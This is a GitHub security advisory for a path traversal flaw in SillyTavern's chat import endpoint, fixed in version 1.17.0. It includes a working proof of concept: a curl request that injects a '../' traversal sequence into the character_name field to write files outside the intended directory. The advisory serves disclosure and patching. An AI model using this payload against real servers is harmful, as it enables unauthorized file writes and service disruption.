# [H] SillyTavern has a path traversal in `/api/chats/import` allows arbitrary file write outside intended chat directory

## Summary
Severity: High
Advisory: GHSA-xvww-xhx6-22pf
CVE: CVE-2026-34522
CWE: CWE-22, CWE-73
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-xvww-xhx6-22pf
Type: github-advisory

## Affected
- npm: `sillytavern` — affected >=0 <1.17.0

## Details
### Summary
A path traversal vulnerability in `/api/chats/import` allows an authenticated attacker to write attacker-controlled files outside the intended chats directory by injecting traversal sequences into `character_name`.

### Details
`character_name` is used unsafely as part of the destination filename and then passed into `path.join(...)` without sanitization.

Evidence:
- Import handler entrypoint:  
  <https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L680-L686>
- Unsanitized `character_name` used in output filename:  
  <https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L719-L723>
- Same write pattern in JSONL import branch:  
  <https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L759-L766>
- Endpoint auth context (authenticated user access):  
  <https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/server-main.js#L239>

Example payload:
- `character_name=../../../../tmp/st_poc`

This causes the final destination path to escape from `<user>/chats/<avatar>/...` and write to an attacker-controlled location such as `/tmp/...` (or any writable path for the service account).

### PoC
Prerequisites:
- Valid authenticated session cookie (`cookie.txt`)
- Valid CSRF token (`$TOKEN`)

Prepare payload:

```bash
printf '{"user_name":"u","chat_metadata":{}}\n{"name":"u","mes":"owned"}\n' >/tmp/poc.jsonl
```

Trigger arbitrary write:

```bash
curl -b cookie.txt -H "x-csrf-token: $TOKEN" \
  -F "avatar=@/tmp/poc.jsonl" \
  -F "file_type=jsonl" \
  -F "avatar_url=a.png" \
  -F "character_name=../../../../tmp/st_poc" \
  -F "user_name=u" \
  http://TARGET:8000/api/chats/import
```

Observed result:
- A file is created outside chats directory, for example:  
  `/tmp/st_poc - <timestamp> imported.jsonl`

### Impact
- Integrity: attacker can create files in unintended filesystem locations.
- Availability: can be used for disk abuse and disruptive file placement.
- Can become more severe when chained with other local processing behaviors.

### Resolution

The issue was addressed in version 1.17.0

## References
- https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-xvww-xhx6-22pf
- https://nvd.nist.gov/vuln/detail/CVE-2026-34522
- https://github.com/SillyTavern/SillyTavern
- https://github.com/SillyTavern/SillyTavern/releases/tag/1.17.0
